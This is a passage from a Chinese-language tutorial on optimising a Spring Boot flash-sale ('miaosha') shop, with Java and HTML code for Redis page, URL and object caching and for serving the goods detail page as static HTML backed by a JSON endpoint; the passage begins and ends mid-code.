&quot;goods_list&quot;;</span><br>        <span class="hljs-comment">//取缓存</span><br>        String html = redisService.get(GoodsKey.getGoodsList,<span class="hljs-string">&quot;&quot;</span>,String.class);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(html))&#123;<br>            <span class="hljs-keyword">return</span> html;<br>        &#125;<br>        IWebContext ctx =<span class="hljs-keyword">new</span> WebContext(request,response,<br>                request.getServletContext(),request.getLocale(),model.asMap());<br>        <span class="hljs-comment">//没有缓存手动渲染</span><br>        html = thymeleafViewResolver.getTemplateEngine().process(<span class="hljs-string">&quot;goods_list&quot;</span>, ctx);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(html))&#123;<br>            redisService.set(GoodsKey.getGoodsList,<span class="hljs-string">&quot;&quot;</span>,html);<br>        &#125;<br>        <span class="hljs-keyword">return</span> html;<br>    &#125;<br></code></pre></td></tr></table></figure><p>编写GoodsKey，设置过期时间为60s，设置过大的数字会降低数据时效性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GoodsKey</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BasePrefix</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">GoodsKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> expireSeconds,String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(prefix);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GoodsKey getGoodsList = <span class="hljs-keyword">new</span> GoodsKey(<span class="hljs-number">60</span>,<span class="hljs-string">&quot;gl&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-1-2-URL缓存"><a href="#5-1-2-URL缓存" class="headerlink" title="5.1.2 URL缓存"></a>5.1.2 URL缓存</h3><p>URL缓存用于修改goods_detail，URL缓存和页面缓存基本一致，区别在于不同的详情页（URL）会显示不同缓存页面+渲染，实质一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/to_detail/&#123;goodsId&#125;&quot;,produces = &quot;text/html&quot;)</span><br>   <span class="hljs-meta">@ResponseBody</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">detail</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Model model,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-meta">@PathVariable(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>&#123;<br>       model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br><br>       <span class="hljs-comment">//取缓存</span><br>       String html = redisService.get(GoodsKey.getGoodsDetail, <span class="hljs-string">&quot;&quot;</span>+goodsId, String.class);<br>       <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(html)) &#123;<br>           <span class="hljs-keyword">return</span> html;<br>       &#125;<br>       <br>       <span class="hljs-comment">//没有缓存手动渲染</span><br>       <span class="hljs-comment">//查询商品详情</span><br>       GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId);<br>       model.addAttribute(<span class="hljs-string">&quot;goods&quot;</span>,goods);<br><br>       <span class="hljs-keyword">long</span> startAt = goods.getStartDate().getTime();<br>       <span class="hljs-keyword">long</span> endAt = goods.getEndDate().getTime();<br>       <span class="hljs-keyword">long</span> now = System.currentTimeMillis();<br><br>       <span class="hljs-keyword">int</span> miaoshaStatus = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">int</span> remainSeconds = <span class="hljs-number">0</span>;<br><br>       <span class="hljs-keyword">if</span> (now &lt; startAt)&#123;<br>           <span class="hljs-comment">//秒杀未开始，倒计时</span><br>           miaoshaStatus = <span class="hljs-number">0</span>;<br>           remainSeconds = (<span class="hljs-keyword">int</span>)(startAt - now) / <span class="hljs-number">1000</span>;<br>       &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(now &gt; endAt)&#123;<br>           <span class="hljs-comment">//秒杀已经结束</span><br>           miaoshaStatus = <span class="hljs-number">2</span>;<br>           remainSeconds = -<span class="hljs-number">1</span>;<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-comment">//秒杀正在进行</span><br>           miaoshaStatus = <span class="hljs-number">1</span>;<br>           remainSeconds = <span class="hljs-number">0</span>;<br>       &#125;<br>       model.addAttribute(<span class="hljs-string">&quot;miaoshaStatus&quot;</span>, miaoshaStatus);<br>       model.addAttribute(<span class="hljs-string">&quot;remainSeconds&quot;</span>, remainSeconds);<br><br>       IWebContext ctx =<span class="hljs-keyword">new</span> WebContext(request,response,<br>               request.getServletContext(),request.getLocale(),model.asMap());<br>       html = thymeleafViewResolver.getTemplateEngine().process(<span class="hljs-string">&quot;goods_detail&quot;</span>, ctx);<br>       <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(html)) &#123;<br>           redisService.set(GoodsKey.getGoodsDetail, <span class="hljs-string">&quot;&quot;</span>+goodsId, html);<br>       &#125;<br>       <span class="hljs-keyword">return</span> html;<br>       <br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="5-1-3-对象缓存"><a href="#5-1-3-对象缓存" class="headerlink" title="5.1.3 对象缓存"></a>5.1.3 对象缓存</h3><p>对象缓存是相比页面缓存是更细粒度的缓存，对象缓存就是当用到用户数据的时候，可以从缓存中取出。比如：更新用户密码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//原来的逻辑是直接到mysql数据库中取用户数据，现在修改为先查redis再查mysql</span><br><span class="hljs-comment">//同时添加了updatePassword方法，注意当有update方法是应该保证redis和mysql数据的一致性</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaUser <span class="hljs-title">getById</span><span class="hljs-params">(Long id)</span></span>&#123;<br>        <span class="hljs-comment">//取缓存</span><br>        MiaoshaUser user = redisService.get(MiaoshaUserKey.getById, <span class="hljs-string">&quot;&quot;</span> + id, MiaoshaUser.class);<br>        <span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> user;<br>        &#125;<br>        <span class="hljs-comment">//缓存没有取数据库</span><br>        user = miaoshaUserDao.getById(id);<br>        <span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>)&#123;<br>            redisService.set(MiaoshaUserKey.getById,<span class="hljs-string">&quot;&quot;</span>+id,user);<br>        &#125;<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">updatePassword</span><span class="hljs-params">(String token,<span class="hljs-keyword">long</span> id,String formPass)</span></span>&#123;<br>        <span class="hljs-comment">//取user</span><br>        MiaoshaUser user = getById(id);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.MOBILE_NOT_EXIST);<br>        &#125;<br>        <span class="hljs-comment">//更新数据库</span><br>        MiaoshaUser toBeUpdate = <span class="hljs-keyword">new</span> MiaoshaUser();<br>        toBeUpdate.setId(id);<br>        toBeUpdate.setPassword(MD5Util.formPassToDBPass(formPass,user.getSalt()));<br>        miaoshaUserDao.update(toBeUpdate);<br>        <span class="hljs-comment">//处理缓存时应该更新两处，1.查询用户时的getById 2.cookie验证中的用户数据</span><br>        <span class="hljs-comment">//1.查询用户的缓存直接删除即可，因为查询用户时查不到会去mysql中查询</span><br>        <span class="hljs-comment">//2.cookie中的用户数据需要得到更新</span><br>        redisService.delete(MiaoshaUserKey.getById,<span class="hljs-string">&quot;&quot;</span>+id);<br>        user.setPassword(toBeUpdate.getPassword());<br>        redisService.set(MiaoshaUserKey.token,token,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>miaoshaUserDao.update()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Update(&quot;update miaosha_user set password = #&#123;password&#125; where id = #&#123;id&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(MiaoshaUser toBeUpdate)</span></span>;<br></code></pre></td></tr></table></figure><p>redisService.delete()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//删除</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(KeyPrefix prefix,String key)</span> </span>&#123;<br>    Jedis jedis = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        jedis = jedisPool.getResource();<br>        <span class="hljs-comment">//生成真正的key</span><br>        String realkey = prefix.getPrefix() + key;<br>        <span class="hljs-keyword">long</span> ret = jedis.del(realkey);<br>        <span class="hljs-keyword">return</span> ret &gt; <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        returnToPool(jedis);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>做完以上操作以后再次启动项目验证QPS</p><p>还有一处可以更新的地方是OrderService中判断当前用户是否已经有订单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaOrder <span class="hljs-title">getMiaoshaOrderByUserIdAndGoodsId</span><span class="hljs-params">(<span class="hljs-keyword">long</span> userId, <span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>    <span class="hljs-comment">//  return orderDao.getMiaoshaOrderByUserIdAndGoodsId(userId, goodsId);</span><br>        <span class="hljs-keyword">return</span> redisService.get(OrderKey.getMiaoshaOrderByuidGid,<span class="hljs-string">&quot;&quot;</span>+userId+<span class="hljs-string">&quot;_&quot;</span>+goodsId,MiaoshaOrder.class);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这样生成订单的时候也要向redis插入数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> OrderInfo <span class="hljs-title">createOrder</span><span class="hljs-params">(MiaoshaUser user, GoodsVo goods)</span> </span>&#123;<br>        OrderInfo orderInfo = <span class="hljs-keyword">new</span> OrderInfo();<br>        orderInfo.setCreateDate(<span class="hljs-keyword">new</span> Date());<br>        orderInfo.setDeliveryAddrId(<span class="hljs-number">0L</span>);<br>        orderInfo.setGoodsCount(<span class="hljs-number">1</span>);<br>        orderInfo.setGoodsId(goods.getId());<br>        orderInfo.setGoodsName(goods.getGoodsName());<br>        orderInfo.setGoodsPrice(goods.getMiaoshaPrice());<br>        orderInfo.setOrderChannel(<span class="hljs-number">1</span>);<br>        orderInfo.setStatus(<span class="hljs-number">0</span>);<br>        orderInfo.setUserId(user.getId());<br>        <span class="hljs-keyword">long</span> orderId = orderDao.insert(orderInfo);<br>        MiaoshaOrder miaoshaOrder = <span class="hljs-keyword">new</span> MiaoshaOrder();<br>        miaoshaOrder.setGoodsId(goods.getId());<br>        miaoshaOrder.setOrderId(orderId);<br>        miaoshaOrder.setUserId(user.getId());<br><br>        orderDao.insertMiaoshaOrder(miaoshaOrder);<br><br>        redisService.set(OrderKey.getMiaoshaOrderByuidGid,<span class="hljs-string">&quot;&quot;</span>+user.getId()+<span class="hljs-string">&quot;_&quot;</span>+goods.getId(),miaoshaOrder);<br>        <span class="hljs-keyword">return</span> orderInfo;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-2-页面静态化，前后端分离"><a href="#5-2-页面静态化，前后端分离" class="headerlink" title="5.2 页面静态化，前后端分离"></a>5.2 页面静态化，前后端分离</h2><h3 id="5-2-1-商品详情页"><a href="#5-2-1-商品详情页" class="headerlink" title="5.2.1 商品详情页"></a>5.2.1 商品详情页</h3><p>当前访问商品详情页是通过redis缓存页面静态代码完成的，现在进一步改进的方式是把每一个页面直接生成静态的html保存在服务器，而不必进行数据库缓存。</p><p>首先修改后端detail代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value=&quot;/detail/&#123;goodsId&#125;&quot;)</span><br>   <span class="hljs-meta">@ResponseBody</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;GoodsDetailVo&gt; <span class="hljs-title">detail</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Model model,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                                       <span class="hljs-meta">@PathVariable(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>       GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId);<br>       <span class="hljs-keyword">long</span> startAt = goods.getStartDate().getTime();<br>       <span class="hljs-keyword">long</span> endAt = goods.getEndDate().getTime();<br>       <span class="hljs-keyword">long</span> now = System.currentTimeMillis();<br>       <span class="hljs-keyword">int</span> miaoshaStatus = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">int</span> remainSeconds = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span>(now &lt; startAt ) &#123;<span class="hljs-comment">//秒杀还没开始，倒计时</span><br>           miaoshaStatus = <span class="hljs-number">0</span>;<br>           remainSeconds = (<span class="hljs-keyword">int</span>)((startAt - now )/<span class="hljs-number">1000</span>);<br>       &#125;<span class="hljs-keyword">else</span>  <span class="hljs-keyword">if</span>(now &gt; endAt)&#123;<span class="hljs-comment">//秒杀已经结束</span><br>           miaoshaStatus = <span class="hljs-number">2</span>;<br>           remainSeconds = -<span class="hljs-number">1</span>;<br>       &#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//秒杀进行中</span><br>           miaoshaStatus = <span class="hljs-number">1</span>;<br>           remainSeconds = <span class="hljs-number">0</span>;<br>       &#125;<br>       GoodsDetailVo vo = <span class="hljs-keyword">new</span> GoodsDetailVo();<br>       vo.setGoods(goods);<br>       vo.setUser(user);<br>       vo.setRemainSeconds(remainSeconds);<br>       vo.setMiaoshaStatus(miaoshaStatus);<br>       <span class="hljs-keyword">return</span> Result.success(vo);<br>   &#125;<br></code></pre></td></tr></table></figure><p>GoodsDetailVo中存放页面详情相关的数据，现在我们不需要返回页面，只需要返回需要静态页面渲染详情页需要的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GoodsDetailVo</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> miaoshaStatus = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> remainSeconds = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">private</span> GoodsVo goods ;<br><span class="hljs-keyword">private</span> MiaoshaUser user;<br><br><span class="hljs-comment">//getter and setter</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以前goods_list中的请求是先发送到后端逻辑处理：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;&#x27;/goods/to_detail/&#x27;+$&#123;goods.id&#125;&quot;</span>&gt;</span>详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>修改为直接访问html页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;&#x27;/goods_detail.htm?goodsId=&#x27;+$&#123;goods.id&#125;&quot;</span>&gt;</span>详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该页面不再借助thymeleaf模板渲染，goods_detail.htm：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel panel-default&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel-heading&quot;</span>&gt;</span>秒杀商品详情<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel-body&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userTip&quot;</span>&gt;</span> 您还没有登录，请登陆后再操作<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>没有收货地址的提示。。。<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodslist&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>商品名称<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>商品图片<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsImg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>秒杀开始时间<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;startTime&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remainSeconds&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;miaoshaTip&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--  </span><br><span class="hljs-comment">        &lt;form id=&quot;miaoshaForm&quot; method=&quot;post&quot; action=&quot;/miaosha/do_miaosha&quot;&gt;</span><br><span class="hljs-comment">        &lt;button class=&quot;btn btn-primary btn-block&quot; type=&quot;submit&quot; id=&quot;buyButton&quot;&gt;立即秒杀&lt;/button&gt;</span><br><span class="hljs-comment">        &lt;input type=&quot;hidden&quot; name=&quot;goodsId&quot;  id=&quot;goodsId&quot; /&gt;</span><br><span class="hljs-comment">        &lt;/form&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-block&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;buyButton&quot;</span><span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;doMiaosha()&quot;</span>&gt;</span>立即秒杀<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;goodsId&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsId&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>商品原价<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span 